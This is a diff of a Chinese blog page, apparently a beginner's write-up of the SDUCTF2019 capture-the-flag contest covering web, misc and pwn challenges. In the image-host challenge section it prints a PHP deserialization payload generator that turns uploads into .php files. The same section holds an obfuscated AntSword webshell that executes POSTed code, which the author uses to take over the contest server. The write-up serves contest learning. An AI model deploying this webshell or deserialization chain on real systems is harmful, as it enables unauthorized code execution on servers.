@@ -98,13 +98,13 @@
 
 
 
-  <meta name="description" content="SDUCTF2019-WriteUp刚入门了ctf2周，便有新生赛玩，真好。 PS.刚准备写wp又放出来一题QAQ ！！！写wp一半又放出题目 说好的周六早上放题的，结果早上起来一脸懵逼 Web0x01 最简答的Web题  题目描述：flag就在html里面，右键点击查看源代码即可查看   直接F12查看源码，找到flag  0x02 按钮点击 题目描述： 想方设法点击按钮   进入页面一个灰色的">
+  <meta name="description" content="SDUCTF2019-WriteUp刚入门了ctf2周，便有新生赛玩，真好。 PS.刚准备写wp又放出来一题QAQ ！！！写wp一半又放出题目 说好的周六早上放题的，结果早上起来一脸懵逼 校园网下pwntools下到崩溃啊啊啊啊啊 Web0x01 最简答的Web题  题目描述：flag就在html里面，右键点击查看源代码即可查看   直接F12查看源码，找到flag  0x02 按钮点击 题目描述">
 <meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SDUCTF2019-wp">
 <meta property="og:url" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/index.html">
 <meta property="og:site_name" content="Hexo&amp;Magic">
-<meta property="og:description" content="SDUCTF2019-WriteUp刚入门了ctf2周，便有新生赛玩，真好。 PS.刚准备写wp又放出来一题QAQ ！！！写wp一半又放出题目 说好的周六早上放题的，结果早上起来一脸懵逼 Web0x01 最简答的Web题  题目描述：flag就在html里面，右键点击查看源代码即可查看   直接F12查看源码，找到flag  0x02 按钮点击 题目描述： 想方设法点击按钮   进入页面一个灰色的">
+<meta property="og:description" content="SDUCTF2019-WriteUp刚入门了ctf2周，便有新生赛玩，真好。 PS.刚准备写wp又放出来一题QAQ ！！！写wp一半又放出题目 说好的周六早上放题的，结果早上起来一脸懵逼 校园网下pwntools下到崩溃啊啊啊啊啊 Web0x01 最简答的Web题  题目描述：flag就在html里面，右键点击查看源代码即可查看   直接F12查看源码，找到flag  0x02 按钮点击 题目描述">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/web1.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/web2-1.jpg">
@@ -142,26 +142,49 @@
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/web21-2.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/web21-3.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/web21-4.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/web23-2.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/web24-7.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/web24.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/web24-8.png">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/web24-3.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/web24-9.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/web24-2.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/web24-6.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/web24-5.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/misc2.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/misc3.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/misc4.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/misc5.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/misc6.jpg">
-<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/pwn1.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/misc7.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/misc7-2.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/pwn2-sjb.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/pwn1.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/pwn3-3.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/pwn3-4.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/pwn3-2.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/pwn3.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/pwn3-5.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/crypto6.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/crypto8.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/mobile-apk1.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/mobile-apk2.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/mobile-apk3-2.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/mobile-apk3-1.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/mobile-apk4-fuck.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/re1-java.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/re2-sductf.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/re3-rust-2.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/re3-rust-3.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/re3-rust-4.jpg">
 <meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/re3-rust-5.jpg">
-<meta property="og:updated_time" content="2019-11-16T05:54:46.606Z">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/re4-1.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/re4-2.jpg">
+<meta property="og:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/re4-3.jpg">
+<meta property="og:updated_time" content="2019-11-19T03:48:26.621Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SDUCTF2019-wp">
-<meta name="twitter:description" content="SDUCTF2019-WriteUp刚入门了ctf2周，便有新生赛玩，真好。 PS.刚准备写wp又放出来一题QAQ ！！！写wp一半又放出题目 说好的周六早上放题的，结果早上起来一脸懵逼 Web0x01 最简答的Web题  题目描述：flag就在html里面，右键点击查看源代码即可查看   直接F12查看源码，找到flag  0x02 按钮点击 题目描述： 想方设法点击按钮   进入页面一个灰色的">
+<meta name="twitter:description" content="SDUCTF2019-WriteUp刚入门了ctf2周，便有新生赛玩，真好。 PS.刚准备写wp又放出来一题QAQ ！！！写wp一半又放出题目 说好的周六早上放题的，结果早上起来一脸懵逼 校园网下pwntools下到崩溃啊啊啊啊啊 Web0x01 最简答的Web题  题目描述：flag就在html里面，右键点击查看源代码即可查看   直接F12查看源码，找到flag  0x02 按钮点击 题目描述">
 <meta name="twitter:image" content="http://magic-king.net/2019/11/15/SDUCTF2019-wp/web1.jpg">
 
 
@@ -488,7 +511,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-11-16 13:54:46" itemprop="dateModified" datetime="2019-11-16T13:54:46+08:00">2019-11-16</time>
+                <time title="修改时间：2019-11-19 11:48:26" itemprop="dateModified" datetime="2019-11-19T11:48:26+08:00">2019-11-19</time>
               
             
           </span>
@@ -551,6 +574,7 @@
 <p>PS.刚准备写wp又放出来一题QAQ</p>
 <p>！！！写wp一半又放出题目</p>
 <p>说好的周六早上放题的，结果早上起来一脸懵逼</p>
+<p>校园网下pwntools下到崩溃啊啊啊啊啊</p>
 <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><center>Web</center></h2><h3 id="0x01-最简答的Web题"><a href="#0x01-最简答的Web题" class="headerlink" title="0x01 最简答的Web题"></a>0x01 最简答的Web题</h3><blockquote>
 <p> 题目描述：flag就在html里面，右键点击查看源代码即可查看 </p>
 </blockquote>
@@ -634,7 +658,12 @@
 <p><img src="/2019/11/15/SDUCTF2019-wp/web12.jpg" alt></p>
 <p>进入页面是个小游戏，发现是hackergame2019原题嘤嘤嘤</p>
 <p>原题wp： <a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/达拉崩吧大冒险/README.md" target="_blank" rel="noopener">https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%BE%BE%E6%8B%89%E5%B4%A9%E5%90%A7%E5%A4%A7%E5%86%92%E9%99%A9/README.md</a> </p>
-<p>不过在买菜这里，有一个大整数溢出，后续会搞懂这个原理</p>
+<p>在买菜这里，有一个大整数溢出，<del>后续会搞懂这个原理</del></p>
+<p>原理如下： <a href="https://blog.csdn.net/zhenghhgz/article/details/78657917" target="_blank" rel="noopener">https://blog.csdn.net/zhenghhgz/article/details/78657917</a> </p>
+<blockquote>
+<p>原意是javascript的所有数字，无论整数还是小数，类型都为Number，为64位浮点数。因此，JavaScript中所有的数都是浮点数。遵循IEEE 754标准（浮点数算术标准），JavaScript所能表示的数值范围为正负1.7976931348623157乘以10的308次方，其最小所能表示的小数为正负5乘以10的负324次方，这两个边界值可以分别通过访问Number对象的MAX_VALUE属性和MIN_VALUE属性来获取。</p>
+<p>JavaScript能表示并进行精确算术运算的整数范围为：正负2的53次方，也即从最小值-9007199254740992到最大值+9007199254740992之间的范围；对于超过这个范围的整数，JavaScript依旧可以进行运算，但却不保证运算结果的精度。值得注意的是，对于整数的位运算（比如移位等操作），JavaScript仅支持32位整型数，也即从-2147483648到+2147483647之间的整数。</p>
+</blockquote>
 <p><img src="/2019/11/15/SDUCTF2019-wp/web12-2.jpg" alt></p>
 <p><img src="/2019/11/15/SDUCTF2019-wp/web12-3.jpg" style="zoom:50%;"></p>
 <p>然后得到flag</p>
@@ -730,6 +759,56 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://url/?first=cyber"</span></span><br><span class="line">reflag = <span class="string">'\d\*\d\+\d\*\d'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qa</span><span class="params">()</span>:</span></span><br><span class="line">	r1 = requests.get(url)</span><br><span class="line">	print(r1.text)</span><br><span class="line">	r2 = re.search(reflag,r1.text)</span><br><span class="line">	print(r2.group())</span><br><span class="line">	ans = eval(r2.group())</span><br><span class="line">	print(ans)</span><br><span class="line">	ck = str(r1.cookies)</span><br><span class="line">	pd = re.search(<span class="string">'PHPSESSID=.* for'</span>,ck)</span><br><span class="line">	pd = pd.group().split(<span class="string">' for'</span>)[<span class="number">0</span>]</span><br><span class="line">	print(pd)</span><br><span class="line">	header = &#123;</span><br><span class="line">	<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0"</span>,</span><br><span class="line">	<span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">	<span class="string">"Cookie"</span>:pd,</span><br><span class="line">	<span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">	<span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span></span><br><span class="line">	&#125;</span><br><span class="line">	data = &#123;<span class="string">"second"</span>:ans&#125;</span><br><span class="line">	print(header)</span><br><span class="line">	r4 =requests.post(url,headers=header,data=data)</span><br><span class="line">	print(r4)</span><br><span class="line">	print(r4.text)<span class="comment">#flag</span></span><br><span class="line">	<span class="keyword">return</span> r4</span><br><span class="line">	</span><br><span class="line">aa = qa()</span><br><span class="line"><span class="comment">#print(aa)</span></span><br></pre></td></tr></table></figure>
 <p>跑出来结果如下，得到flag</p>
 <p><img src="/2019/11/15/SDUCTF2019-wp/web21-4.jpg" alt></p>
+<h3 id="0x15-信息泄露"><a href="#0x15-信息泄露" class="headerlink" title="0x15 信息泄露"></a>0x15 信息泄露</h3><blockquote>
+<p>题目描述： 信息泄露了，快拿到它 </p>
+</blockquote>
+<p>猜是php+Git泄露，参考如下文章，访问<code>http://url/.git/HEAD</code>，果然下载了HEAD文件</p>
+<p>文件里写着：<code>ref: refs/heads/master</code>，按如下文章提取了访问<code>url/refs/heads/master</code>，提取了master里的文件：<code>985e6ce910e4cffa9957cf88fd9ac28c13654d6c</code></p>
+<blockquote>
+<p> <a href="https://www.jianshu.com/p/0ea09975169d" target="_blank" rel="noopener">https://www.jianshu.com/p/0ea09975169d</a> </p>
+<p><a href="https://www.cnblogs.com/xhds/p/10884647.html" target="_blank" rel="noopener">https://www.cnblogs.com/xhds/p/10884647.html</a> </p>
+</blockquote>
+<p><img src="/2019/11/15/SDUCTF2019-wp/web23-2.jpg" alt></p>
+<p>然后发现GitHack一波就得到flag了emmmmmmmm</p>
+<h3 id="0x16-web图床"><a href="#0x16-web图床" class="headerlink" title="0x16 web图床"></a>0x16 web图床</h3><blockquote>
+<p>题目描述： 图床开发中，先放出来给你们玩一下 </p>
+</blockquote>
+<p>进入发现是一个登陆网页，想要注入却是登陆失败，那就注册一个试试</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/web24-7.jpg" alt></p>
+<p>注册后登陆进去，是一个可以上传图片的网页，其他啥东西也没有，推测是用图片做一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy	a.png/b+<span class="number">1.</span>php  t.png</span><br></pre></td></tr></table></figure>
+<p>但是发现上传上去之后返回的是就是图片，改后缀也无法访问其php文件</p>
+<p>于是尝试了各种图片一句话木马的可能，比如截断，抓包改后缀，发现服务器只接受图片文件，而且无论是什么格式的图片会被改成png格式进行呈现，而且不能上传其他格式的文件。</p>
+<p>其中中间网页貌似崩了一下，看到是ThinkPHP V5.1 ，百度搜其漏洞，发现也没法实现</p>
+<p>其展示的后面解md5得到是172.2.0.2，想着内网地址也没得访问，后面跟着也是文件的MD5值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Index of /upload/fd40c7f4125a9b9ff1a4e75d293e3080/</span><br><span class="line">MD5(172.2.0.2) = fd40c7f4125a9b9ff1a4e75d293e3080</span><br></pre></td></tr></table></figure></p>
+<p>抓包看Cookie解析之后，想改Cookie其中的文件后缀也没用。</p>
+<p>后面实在没思路了，就打算对网站进行一波路径扫描，结果发现了惊喜，有一个<code>www.tar.gz</code>，访问下载文件，发现就是php源码了。</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/web24.jpg" alt></p>
+<p>不过我还没到能完全审计php源码的高度，我就将其中一部分的源码取用百度搜索，果然搜到了原题</p>
+<blockquote>
+<p><a href="https://www.freebuf.com/column/205789.html" target="_blank" rel="noopener">https://www.freebuf.com/column/205789.html</a> </p>
+<p><a href="https://blog.csdn.net/qq_26406447/article/details/90671853" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/90671853</a> </p>
+<p> <a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a> </p>
+</blockquote>
+<p>通过PHP反序列化，得到cookie去使文件转化时，解析成php。</p>
+<p>php发序列号程序如下，用生成的结果替换已有的Cookie即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$profile = <span class="keyword">new</span> Profile();</span><br><span class="line">$profile-&gt;except = [<span class="string">'index'</span> =&gt; <span class="string">'img'</span>];</span><br><span class="line">$profile-&gt;img = <span class="string">"upload_img"</span>;</span><br><span class="line">$profile-&gt;ext = <span class="string">"png"</span>;</span><br><span class="line">$profile-&gt;filename_tmp = <span class="string">"../public/upload/md5(user)/md5(filename).png"</span>;</span><br><span class="line">$profile-&gt;filename = <span class="string">"../public/upload/md5(user)/xxx.php"</span>;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register();</span><br><span class="line">$register-&gt;registed = <span class="keyword">false</span>;</span><br><span class="line">$register-&gt;checker = $profile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure>
+<p>不过复现时也遇到了不少麻烦，通过以下代码构造payload然后去替代我们的Cookie，刷新后得到我们修改后缀的php图片马。</p>
+<p>不过在用户已登录时改Cookie时没用，要等到退出账户到登陆界面时设置新建Cookie，再刷新得到如下界面说明成功了</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/web24-8.png" alt></p>
+<p>此时，去访问<code>url/upload/</code>即可看到我们修改的php后缀的文件，同时在上传做php图片马时也遇到了问题</p>
+<p>以下是中国蚁剑生成的免杀马，和png图片拼接在一起上传后发现无法解析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISGM</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MaRC</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $XYUg = <span class="string">"\xf9"</span> ^ <span class="string">"\x98"</span>;</span><br><span class="line">        $LaqL = <span class="string">"\x57"</span> ^ <span class="string">"\x24"</span>;</span><br><span class="line">        $LXlg = <span class="string">"\xe0"</span> ^ <span class="string">"\x93"</span>;</span><br><span class="line">        $kYoS = <span class="string">"\x7a"</span> ^ <span class="string">"\x1f"</span>;</span><br><span class="line">        $zzTF = <span class="string">"\xaf"</span> ^ <span class="string">"\xdd"</span>;</span><br><span class="line">        $hteZ = <span class="string">"\x9f"</span> ^ <span class="string">"\xeb"</span>;</span><br><span class="line">        $DBlL =$XYUg.$LaqL.$LXlg.$kYoS.$zzTF.$hteZ;</span><br><span class="line">        <span class="keyword">return</span> $DBlL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $LlRV=<span class="keyword">$this</span>-&gt;MaRC();</span><br><span class="line">        @$LlRV(<span class="keyword">$this</span>-&gt;So);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$isgm = <span class="keyword">new</span> ISGM();</span><br><span class="line">@$isgm-&gt;So = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])?base64_decode($_POST[<span class="string">'pass'</span>]):$_POST[<span class="string">'pass'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后尝试自己写了一个，拼接在一起也没有躲开这个错误的厄运</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/web24-3.jpg" alt></p>
+<p>查看图片马的源码发现如下：</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/web24-9.jpg" alt></p>
+<p>可能是png文件尾和php头部拼接，导致一些转义问题，php失去头部<code>&lt;?php</code>导致解析php解析失败</p>
+<p>然后尝试用jpg文件去做一个图片马、上传，果然成功了</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/web24-2.jpg" alt></p>
+<p>然后用中国蚁剑连上服务器，在根目录下找到flag</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/web24-6.jpg" alt></p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/web24-5.jpg" alt></p>
 <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><center>Misc</center></h2><h3 id="0x01-Gif"><a href="#0x01-Gif" class="headerlink" title="0x01 Gif"></a>0x01 Gif</h3><blockquote>
 <p>题目描述： Gif你眼神够快吗？ </p>
 </blockquote>
@@ -765,19 +844,49 @@
 <p>打开附件PIC.zip，发现里面有四个压缩文件，发现解压不了。扔binwalk跑一波发现是jpeg，直接改后缀得到jpg图片。</p>
 <p>四个压缩文件分别是QRcode四等分，用画图把他们拼一起，获得一张完整的二维码，扫码得到flag。</p>
 <p><img src="/2019/11/15/SDUCTF2019-wp/misc6.jpg" alt></p>
-<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a><center>PWN</center></h2><h3 id="0x01-Simple-nc"><a href="#0x01-Simple-nc" class="headerlink" title="0x01 Simple nc"></a>0x01 Simple nc</h3><blockquote>
-<p>题目描述： 你会使用nc命令吗?<br>                    可能是全球最简单的pwn题目 </p>
+<h3 id="0x07-zip"><a href="#0x07-zip" class="headerlink" title="0x07 zip"></a>0x07 zip</h3><blockquote>
+<p>题目描述： 这是一个加密的压缩包，你能打开它吗？ </p>
 </blockquote>
-<p><img src="/2019/11/15/SDUCTF2019-wp/pwn1.jpg" alt></p>
-<p>虽然pwn还没入门，不过这确实是最简单得pwn。</p>
-<p>熟悉nc即netcat命令即可，<code>netcat ctf.sec.sdunet.cn 38849</code>直接连上通过<code>ls,cat</code>命令读取flag</p>
-<h3 id="0x02-猜拳"><a href="#0x02-猜拳" class="headerlink" title="0x02 猜拳"></a>0x02 猜拳</h3><blockquote>
+<p><del>发现没有截图，就说下思路把</del>，转手就去把图截了，显示一个password.zip伪加密，用ZipCenOp解开伪加密，看到里面还有一个压缩包</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/misc7.jpg" alt></p>
+<p>但是压缩包里面是一个图片文件，写着flag不在这</p>
+<p>于是就把里面那个zip拖进010editor查看，发现是隐写一个压缩包，直接看到flag，复制提交就完了</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/misc7-2.jpg" alt></p>
+<h3 id="0x08-猜拳"><a href="#0x08-猜拳" class="headerlink" title="0x08 猜拳"></a>0x08 猜拳</h3><blockquote>
 <p>题目描述： 猜拳，你能赢过机器人吗？ </p>
 </blockquote>
 <p>又是没有思路的pwn，上网搜索得知python有个pwn库可以计算随机数种子，既然是猜，我就自己找一波规律。</p>
 <p><img src="/2019/11/15/SDUCTF2019-wp/pwn2-sjb.jpg" alt></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">robot: 		bsj sjb jbs</span><br><span class="line">I can win: 	jbs bsj sjb</span><br></pre></td></tr></table></figure>
 <p>找规律得知对面出拳是一个循环，自己手动解一波得到flag</p>
+<p>(竟然改成Misc了，果然不是一道pwn题)</p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a><center>PWN</center></h2><h3 id="0x01-Simple-nc"><a href="#0x01-Simple-nc" class="headerlink" title="0x01 Simple nc"></a>0x01 Simple nc</h3><blockquote>
+<p>题目描述： 你会使用nc命令吗?<br>                    可能是全球最简单的pwn题目 </p>
+</blockquote>
+<p><img src="/2019/11/15/SDUCTF2019-wp/pwn1.jpg" alt></p>
+<p>虽然pwn还没入门，不过这确实是最简单得pwn。</p>
+<p>熟悉nc即netcat命令即可，<code>netcat ctf.sec.sdunet.cn 38849</code>直接连上通过<code>ls,cat</code>命令读取flag</p>
+<h3 id="0x02-StackOverflow"><a href="#0x02-StackOverflow" class="headerlink" title="0x02 StackOverflow"></a>0x02 StackOverflow</h3><blockquote>
+<p>题目描述： 作为程序员怎么会不知道 <a href="https://stackoverflow.com/" target="_blank" rel="noopener">https://stackoverflow.com/</a> </p>
+</blockquote>
+<p>一道基本的栈溢出题目，但是中间的编码问题令人烦躁</p>
+<p>用IDA逆向，看到主函数。</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/pwn3-3.jpg" alt></p>
+<p>进入hello()函数可以看到如下：其中有get函数</p>
+<p>根据<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/" target="_blank" rel="noopener">ctf-wiki</a>的pwn的基本教程的get栈溢出就可以做出来</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/pwn3-4.jpg" alt></p>
+<p>还在其中找到success，这应该就是我们getshell的函数</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/pwn3-2.jpg" alt></p>
+<p>根据ctf-wiki构造exp</p>
